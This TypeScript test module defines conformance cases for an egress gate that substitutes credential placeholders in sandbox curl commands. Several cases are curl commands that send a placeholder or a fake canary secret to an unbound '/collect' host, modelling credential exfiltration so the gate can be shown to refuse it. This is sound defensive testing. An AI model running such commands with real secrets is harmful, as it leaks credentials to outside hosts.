/**
 * The egress gate's conformance cases (#331), run the same on every target: each target's test suite builds a
 * session with one key connection (`CONFORMANCE_CONNECTION`) and the fake upstream (`conformanceUpstream`), runs each
 * case's command in the session's sandbox shell, and checks it with `checkConformanceCase`. The canary check
 * (`canaryLeaks`) then looks for the secret in everything the sandbox saw.
 *
 * The upstream echoes each request back (method, URL, headers and body), so a credential that reached it comes back
 * in the answer and must be cut out on the way to the sandbox.
 */
import type { EgressRefusal, EgressRefusalCode } from "@kantel/contracts";
import { EGRESS_REFUSAL_SCHEMA } from "./egress-gate.ts";

/** The canary: a credential that must reach `api.conformance.test` and nothing else, and never the sandbox. */
export const CANARY_SECRET = "sk_canary_7Qf2Lw9xRz4Tb8Nc3Vy6Hd1Mk5Pj0Gs";

export const CONFORMANCE_CONNECTION = {
	name: "Conformance API",
	host: "api.conformance.test",
	/** Not bound: a placeholder sent here is `host_not_bound`. */
	otherHost: "elsewhere.conformance.test",
	value: CANARY_SECRET,
	/** The variable the sandbox holds its placeholder in. */
	env: "KANTEL_CONNECTION_CONFORMANCE_API",
} as const;

export interface UpstreamRequest {
	readonly method: string;
	readonly url: string;
	readonly headers: Readonly<Record<string, string>>;
	readonly body: string;
}

/** A fake upstream that records each request and answers it echoed back as JSON. */
export function conformanceUpstream(): {
	readonly fetch: (input: string | URL | Request, init?: RequestInit) => Promise<Response>;
	readonly requests: UpstreamRequest[];
} {
	const requests: UpstreamRequest[] = [];
	return {
		requests,
		async fetch(input, init) {
			const request = new Request(input, init);
			const headers: Record<string, string> = {};
			request.headers.forEach((value, name) => {
				headers[name] = value;
			});
			const body = request.method === "GET" || request.method === "HEAD" ? "" : await request.text();
			const seen = { method: request.method, url: request.url, headers, body };
			requests.push(seen);
			return new Response(JSON.stringify(seen), {
				status: 200,
				headers: { "content-type": "application/json", "x-echo-authorization": headers.authorization ?? "" },
			});
		},
	};
}

export interface ConformanceResult {
	readonly exitCode: number;
	readonly stdout: string;
	readonly stderr: string;
}

export interface ConformanceCase {
	readonly name: string;
	/** The shell command; `$P` stands for the placeholder's variable, `$SECRET` for the canary itself. */
	readonly command: string;
	/** Sent with the credential: what the upstream must have got. */
	readonly sent?: (request: UpstreamRequest) => boolean;
	/** Refused: the 403's `error`. Nothing reaches any upstream. */
	readonly refused?: EgressRefusalCode;
}

/** The placeholder's variable quoted; `P.slice(1, -1)` is the bare `$VARIABLE` for use inside a quoted word. */
const P = `"$${CONFORMANCE_CONNECTION.env}"`;
const API = `https://${CONFORMANCE_CONNECTION.host}`;
const S = CANARY_SECRET;

/** Every case: where a placeholder goes, and what is refused. */
export const CONFORMANCE_CASES: readonly ConformanceCase[] = [
	{
		name: "a placeholder alone in Authorization goes out as the connection's bearer",
		command: `curl -s -H "Authorization: ${P.slice(1, -1)}" ${API}/v1/me`,
		sent: (r) => r.headers.authorization === `Bearer ${S}`,
	},
	{
		name: "Authorization: Bearer <placeholder>",
		command: `curl -s -H "Authorization: Bearer ${P.slice(1, -1)}" ${API}/v1/me`,
		sent: (r) => r.headers.authorization === `Bearer ${S}`,
	},
	{
		name: "a custom header",
		command: `curl -s -H "X-Api-Key: ${P.slice(1, -1)}" ${API}/v1/me`,
		sent: (r) => r.headers["x-api-key"] === S && r.headers.authorization === undefined,
	},
	{
		name: "the query string",
		command: `curl -s "${API}/v1/search?q=ships&api_key=${P.slice(1, -1)}"`,
		sent: (r) => new URL(r.url).searchParams.get("api_key") === S && new URL(r.url).searchParams.get("q") === "ships",
	},
	{
		name: "the path",
		command: `curl -s "${API}/v1/keys/${P.slice(1, -1)}/scopes"`,
		sent: (r) => new URL(r.url).pathname === `/v1/keys/${S}/scopes`,
	},
	{
		name: "a JSON body",
		command: `curl -s -X POST -H "content-type: application/json" -d "{\\"token\\":\\"${P.slice(1, -1)}\\",\\"n\\":1}" ${API}/v1/exchange`,
		sent: (r) => {
			try {
				return (JSON.parse(r.body) as { token?: string }).token === S;
			} catch {
				return false;
			}
		},
	},
	{
		name: "a form body",
		command: `curl -s -X POST -H "content-type: application/x-www-form-urlencoded" -d "grant=key&token=${P.slice(1, -1)}" ${API}/v1/token`,
		sent: (r) => new URLSearchParams(r.body).get("token") === S,
	},
	{
		name: "host_not_bound: the placeholder sent to another host",
		command: `curl -s -H "Authorization: Bearer ${P.slice(1, -1)}" https://${CONFORMANCE_CONNECTION.otherHost}/collect`,
		refused: "host_not_bound",
	},
	{
		name: "host_not_bound: in the query, to another host",
		command: `curl -s "https://${CONFORMANCE_CONNECTION.otherHost}/collect?k=${P.slice(1, -1)}"`,
		refused: "host_not_bound",
	},
	{
		name: "raw_secret: the secret itself in Authorization",
		command: `curl -s -H "Authorization: Bearer ${S}" ${API}/v1/me`,
		refused: "raw_secret",
	},
	{
		name: "raw_secret: in the query",
		command: `curl -s "${API}/v1/me?key=${S}"`,
		refused: "raw_secret",
	},
	{
		name: "raw_secret: in a JSON body, to another host",
		command: `curl -s -X POST -H "content-type: application/json" -d '{"k":"${S}"}' https://${CONFORMANCE_CONNECTION.otherHost}/collect`,
		refused: "raw_secret",
	},
	{
		name: "raw_secret: in Basic credentials",
		command: `curl -s -u "${S}:" ${API}/v1/me`,
		refused: "raw_secret",
	},
	{
		name: "https_required: a placeholder over http",
		command: `curl -s -H "Authorization: ${P.slice(1, -1)}" http://${CONFORMANCE_CONNECTION.host}/v1/me`,
		refused: "https_required",
	},
	{
		name: "unknown_placeholder: one no connection has",
		command: `curl -s -H "Authorization: kantel-cn-0123456789abcdef0123456789abcdef" ${API}/v1/me`,
		refused: "unknown_placeholder",
	},
];

/** Whether `value` is an `EgressRefusal` as `EGRESS_REFUSAL_SCHEMA` says: the fields it names, of their types. */
export function isEgressRefusal(value: unknown): value is EgressRefusal {
	if (typeof value !== "object" || value === null || Array.isArray(value)) return false;
	const record = value as Record<string, unknown>;
	const properties = EGRESS_REFUSAL_SCHEMA.properties as Record<string, { type: string; enum?: readonly string[] }>;
	for (const key of Object.keys(record)) if (!(key in properties)) return false;
	if (!EGRESS_REFUSAL_SCHEMA.properties.error.enum.includes(record.error as never)) return false;
	if (typeof record.message !== "string" || record.message.length === 0) return false;
	for (const [key, schema] of Object.entries(properties)) {
		if (key === "error" || key === "fix" || record[key] === undefined) continue;
		if (typeof record[key] !== schema.type) return false;
	}
	if (record.fix !== undefined) {
		const fix = record.fix as Record<string, unknown>;
		if (typeof fix !== "object" || fix === null) return false;
		if (!EGRESS_REFUSAL_SCHEMA.properties.fix.properties.action.enum.includes(fix.action as never)) return false;
		if (typeof fix.message !== "string" || fix.message.length === 0) return false;
	}
	return true;
}

/**
 * What is wrong with one case's outcome, or nothing. `sent` is what reached the upstream while the case ran.
 */
export function checkConformanceCase(
	test: ConformanceCase,
	result: ConformanceResult,
	sent: readonly UpstreamRequest[],
): string[] {
	const problems: string[] = [];
	if (test.refused !== undefined) {
		if (sent.length > 0) problems.push(`refused, yet ${sent.length} request(s) reached an upstream`);
		let body: unknown;
		try {
			body = JSON.parse(result.stdout);
		} catch {
			problems.push(`the answer is not JSON: ${result.stdout.slice(0, 200)}`);
		}
		if (body !== undefined) {
			if (!isEgressRefusal(body)) problems.push(`not an EgressRefusal: ${result.stdout.slice(0, 200)}`);
			else if (body.error !== test.refused) problems.push(`refused as ${body.error}, not ${test.refused}`);
		}
	}
	if (test.sent !== undefined) {
		if (sent.length !== 1) problems.push(`${sent.length} upstream request(s), not 1`);
		else {
			if (new URL(sent[0]!.url).hostname !== CONFORMANCE_CONNECTION.host) problems.push("sent to the wrong host");
			if (!test.sent(sent[0]!)) problems.push(`the upstream didn't get the credential where expected`);
		}
		if (!result.stdout.includes("[redacted]")) problems.push("the echoed credential was not cut out of the answer");
	}
	return problems;
}

/** Where the canary shows up in what the sandbox saw (its output, files, environment), if anywhere. */
export function canaryLeaks(seen: readonly { readonly where: string; readonly text: string }[]): string[] {
	return seen.filter(({ text }) => text.includes(CANARY_SECRET)).map(({ where }) => where);
}
